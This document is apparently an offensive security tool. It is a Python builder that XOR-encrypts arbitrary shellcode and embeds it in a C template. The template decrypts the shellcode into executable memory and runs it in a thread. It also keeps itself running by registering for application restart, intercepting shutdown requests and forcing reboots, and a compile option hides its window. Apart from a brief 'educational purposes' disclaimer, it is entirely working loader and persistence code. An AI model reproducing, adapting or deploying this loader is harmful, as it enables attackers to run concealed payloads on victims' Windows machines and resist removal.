
# * PhantomPersist by S1n1st3r @ Phantom Security Group
# * This code is a proof of concept for a Windows application that persists across reboots, shutdowns, and logoffs.
# *
# * Disclaimer: This code is intended for educational purposes only. Use it responsibly and ethically.

# Compile 
# With popup: x86_64-w64-mingw32-gcc -o phantom.exe phantom.c -luser32 -ladvapi32 -DUNICODE -D_UNICODE
# Without popup: x86_64-w64-mingw32-gcc -o phantom.exe phantom.c -luser32 -ladvapi32 -mwindows -DUNICODE -D_UNICODE
 

import sys
import os

#Update 2.0 - XOR key (can be changed anytime)
XOR_KEY = b"\x13\x37\xC0\xDE"

#Update 2.0 - DLL template with XOR decryptor
PHANTOMPERSIST_TEMPLATE = r"""
#include <windows.h>
#include <stdio.h>

unsigned char encrypted_shellcode[] = {
{{ENCRYPTED_SHELLCODE}}
};

unsigned char xor_key[] = {
{{XOR_KEY}}
};

void decrypt_shellcode(unsigned char* data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= xor_key[i % sizeof(xor_key)];
    }
}

void inject_shellcode() {
    size_t len = sizeof(encrypted_shellcode);
    //printf("[*] inject_shellcode: decrypting %zu bytes\n", len);
    decrypt_shellcode(encrypted_shellcode, len);
    //printf("[+] inject_shellcode: decryption complete\n");

    void* exec = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) {
        //printf("[-] inject_shellcode: VirtualAlloc failed (error %lu)\n", GetLastError());
        Sleep(6);
        return;
    }
    //printf("[+] inject_shellcode: VirtualAlloc succeeded at %p\n", exec);

    memcpy(exec, encrypted_shellcode, len);
    //printf("[*] inject_shellcode: shellcode copied, creating thread\n");

    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    if (thread) {
        //printf("[+] inject_shellcode: thread created, waiting for completion\n");
        WaitForSingleObject(thread, INFINITE);
        //printf("[+] inject_shellcode: thread completed\n");
        CloseHandle(thread);
    } else {
		Sleep(6);
        //printf("[-] inject_shellcode: CreateThread failed (error %lu)\n", GetLastError());
    }

    //printf("[*] inject_shellcode: wiping shellcode from memory\n");
    SecureZeroMemory(encrypted_shellcode, len);
    //printf("[+] inject_shellcode: done\n");
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
	switch (message) {
	case WM_QUERYENDSESSION:
		//printf("Shutdown requested. Blocking for now.\n");
		ShutdownBlockReasonCreate(hWnd, TEXT("PhantomPersist Shutting down..."));
		AbortSystemShutdown(NULL);

		// Enable SE_SHUTDOWN_NAME privilege
		HANDLE hToken;
		TOKEN_PRIVILEGES tkp;
		OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
		LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
		tkp.PrivilegeCount = 1;
		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
		CloseHandle(hToken);

		ShutdownBlockReasonDestroy(hWnd);
		if (!ExitWindowsEx(EWX_RESTARTAPPS | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER)) {
			//printf("Failed to reboot\n");
		}

		return TRUE;

	case WM_ENDSESSION:
		//printf("Shutdown completed.\n");
		ShutdownBlockReasonDestroy(hWnd);
		break;

	case WM_DESTROY:
		PostQuitMessage(0);
		break;

	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}


DWORD WINAPI MessageLoopThread(void* param) {
	//printf("[*] MessageLoopThread: starting\n");
	TCHAR szWindowClass[] = TEXT("PhantomPersist_MessageWindow");
	WNDCLASSEX wcex;
	wcex.cbSize = sizeof(WNDCLASSEX);
	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = GetModuleHandle(NULL);
	wcex.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = NULL;
	wcex.lpszClassName = szWindowClass;
	wcex.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

	if (!RegisterClassEx(&wcex)) {
		Sleep(6);
		//printf("[-] MessageLoopThread: RegisterClassEx failed (error %lu)\n", GetLastError());
		return 1;
	}
	//printf("[+] MessageLoopThread: window class registered\n");

	HWND hWnd = CreateWindow(szWindowClass, TEXT(""), WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 0, 0, NULL, NULL, GetModuleHandle(NULL), NULL);
	if (!hWnd) {
		Sleep(6);
		//printf("[-] MessageLoopThread: CreateWindow failed (error %lu)\n", GetLastError());
		return 1;
	}
	//printf("[+] MessageLoopThread: hidden window created\n");

	if (!SetProcessShutdownParameters(0x4FF, SHUTDOWN_NORETRY)) {
		if (!SetProcessShutdownParameters(0x400, SHUTDOWN_NORETRY)) {
			if (!SetProcessShutdownParameters(0x3FF, SHUTDOWN_NORETRY)) {
				Sleep(6);
				//printf("[-] MessageLoopThread: SetProcessShutdownParameters failed\n");
				return 1;
			}
		}
	}
	//printf("[+] MessageLoopThread: shutdown parameters set, entering message loop\n");

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	//printf("[*] MessageLoopThread: message loop exited\n");
	return 0;
}

int main()
{

	if (FAILED(RegisterApplicationRestart(NULL, 0))) {
		//printf("Failed to register application restart\n");
        Sleep(6);
		return 1;
	}
	//printf("[+] Registered application restart\n");
	//printf("[+] Sleeping 60 seconds to ensure registration\n");
	Sleep(60000);
	//printf("[+] Starting message loop thread. Go ahead shutdown/restart.\n");

	// Start the message loop thread
	HANDLE hThread = CreateThread(NULL, 0, MessageLoopThread, NULL, 0, NULL);
	if (!hThread) {
		//printf("Failed to create message loop thread.\n");
        Sleep(6);
		return 1;
	}

	// We don't need to wait for the thread
	CloseHandle(hThread);

	// Loop forever to keep the main thread alive (You would be executing you payload here)
    int count = 0;
    while (1) {
		if (count == 0) {
			//printf("Injecting Code.\n");
			inject_shellcode();
			count++;
		}
		Sleep(60000);
	}    
	

}
"""  
def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def format_bytes_as_c_array(data: bytes, columns: int = 8) -> str:
    hex_bytes = [f"0x{b:02x}," for b in data]
    return "\n" + "\n".join(
        "    " + " ".join(hex_bytes[i:i+columns])
        for i in range(0, len(hex_bytes), columns)
    )

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <shellcode.bin>")
        sys.exit(1)

    bin_path = sys.argv[1]
    if not os.path.exists(bin_path):
        print(f"[!] File not found: {bin_path}")
        sys.exit(1)

    with open(bin_path, "rb") as f:
        shellcode = f.read()

    encrypted = xor_encrypt(shellcode, XOR_KEY)
    encrypted_c = format_bytes_as_c_array(encrypted)
    key_c = format_bytes_as_c_array(XOR_KEY)

    final_code = PHANTOMPERSIST_TEMPLATE.replace("{{ENCRYPTED_SHELLCODE}}", encrypted_c)
    final_code = final_code.replace("{{XOR_KEY}}", key_c)

    output_file = "phantompersist.c"
    with open(output_file, "w") as f:
        f.write(final_code)

    print(f"[+] XOR-encrypted DLL source generated: {output_file}")
    print(f"[+] Original shellcode size: {len(shellcode)} bytes")
    print(f"[+] Encrypted payload size: {len(encrypted)} bytes")
    print(f"[+] XOR key used ({len(XOR_KEY)} bytes): {XOR_KEY.hex()}")
    print()
    print("[*] To compile (using MinGW):")
    # print("    x86_64-w64-mingw32-gcc -o phantom.exe phantompersist.c -luser32 -ladvapi32 -DUNICODE -D_UNICODE")
    print("    x86_64-w64-mingw32-gcc -o phantom.exe phantompersist.c -luser32 -ladvapi32 -DUNICODE -D_UNICODE -mwindows")
    print()

if __name__ == "__main__":
    main()
